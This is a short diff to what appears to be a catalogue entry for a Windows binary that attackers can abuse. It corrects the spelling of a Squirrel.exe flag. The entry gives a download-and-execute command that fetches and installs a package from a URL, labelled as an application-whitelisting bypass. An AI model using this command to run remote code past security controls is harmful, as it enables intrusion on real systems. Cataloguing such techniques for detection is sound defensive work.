@@ -25,7 +25,7 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
-  - Command: squirrel.exe --updateRoolback=[url to package]
+  - Command: squirrel.exe --updateRollback=[url to package]
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
     Usecase: Download and execute binary
     Category: AWL Bypass
